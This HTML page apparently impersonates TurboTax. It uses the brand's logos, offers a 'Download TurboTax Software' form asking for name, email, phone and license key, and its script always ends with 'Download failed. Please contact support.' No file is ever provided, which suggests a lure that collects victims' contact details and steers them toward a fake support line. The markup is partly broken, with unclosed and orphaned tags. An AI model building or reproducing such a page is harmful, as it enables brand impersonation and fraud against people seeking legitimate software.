<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: Arial, sans-serif;
}

/* HEADER */
header {
    background: #0077c5;
    padding: 15px 30px;
}

.header-container {
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.logo img {
    height: 60px;
}

/* NAV */
nav ul {
    list-style: none;
    display: flex;
    gap: 20px;
}

nav ul li a {
    color: #fff;
    text-decoration: none;
    font-size: 14px;
}

nav ul li a:hover {
    text-decoration: underline;
}

/* MAIN */
.main-container {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 40px;
    min-height: 80vh;
    background: #f5f7fa;
    padding: 20px;
}

.form-box {
    background: #fff;
    padding: 40px;
    width: 360px;
    border-radius: 12px;
    box-shadow: 0 8px 25px rgba(0,0,0,0.1);
    text-align: center;
}

.top-icon img {
    width: 60px;
    margin-bottom: 15px;
}

.input-group {
    position: relative;
    margin-bottom: 20px;
}

.input-group i {
    position: absolute;
    top: 12px;
    left: 12px;
}

.input-group input {
    width: 100%;
    padding: 10px 10px 10px 38px;
    border: 1px solid #ccc;
    border-radius: 6px;
}

.btn {
    width: 100%;
    padding: 12px;
    background: #e11d48;
    color: #fff;
    border: none;
    border-radius: 6px;
    cursor: pointer;
}

.btn:hover {
    background: #be123c;
}

.right-sidebar img {
    width: 600px;
    border-radius: 20px;
}

footer {
    background: #222;
    padding: 40px;
    text-align: center;
    color: #ccc;
}

/* Responsive */
@media (max-width: 900px) {
    .main-container {
        flex-direction: column;
    }

    .right-sidebar img {
        width: 250px;
    }
}
</style>

<body>

<header>
    <div class="header-container">
        <div class="logo">
            <img src="https://1000logos.net/wp-content/uploads/2023/04/TurboTax-logo.png">

    </div>
</header>

<section class="main-container">

    <div class="form-box">
        <div class="top-icon">
            <img src="https://i0.wp.com/blog.turbotax.intuit.com/wp-content/uploads/2022/10/image.png?resize=256%2C256&ssl=1">
        </div>

        <h2>Download TurboTax Software</h2>

        <div class="input-group">
            <i class="fas fa-user"></i>
            <input id="name" type="text" placeholder="Full Name">
        </div>

        <div class="input-group">
            <i class="fas fa-envelope"></i>
            <input id="email" type="email" placeholder="Email">
        </div>

        <div class="input-group">
            <i class="fas fa-phone"></i>
            <input id="phone" type="tel" placeholder="Phone">
        </div>

        <div class="input-group">
            <i class="fas fa-key"></i>
            <input id="license" type="text" placeholder="License Key">
        </div>

        <button id="downloadBtn" class="btn">Download</button>
        <p id="message"></p>
    </div>

    <div class="right-sidebar">
        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrLnzku2YAxGtNPfMp_LFQV1qGC_1PGbphx1342UOxJrCFKfIv38ohJyQ5smIKdJvdv-YwPT6TktYO3DTbtKlxz4h9qfQL74mhrbbARaVhl3t2TNYlx7JzoIAsngsw7hpgqUBd08y_ZL6KLRqnezgXfJcgUtGucavluwEneOeiqJkI1BSID-eQY6qwLQ/s1536/turdox.png">

    <p>© 2026 TurboTax Help Guide</p>
</footer>

<script>
const btn = document.getElementById("downloadBtn");
const message = document.getElementById("message");

btn.onclick = function () {
    const name = document.getElementById("name").value.trim();
    const email = document.getElementById("email").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const license = document.getElementById("license").value.trim();

    if (!name || !email || !phone || !license) {
        message.style.color = "red";
        message.innerText = "All fields required";
        return;
    }

    message.style.color = "green";
    message.innerText = "Preparing download...";

    setTimeout(() => {
        message.innerHTML = "Download failed. Please contact support.";
    }, 4000);
};
</script>
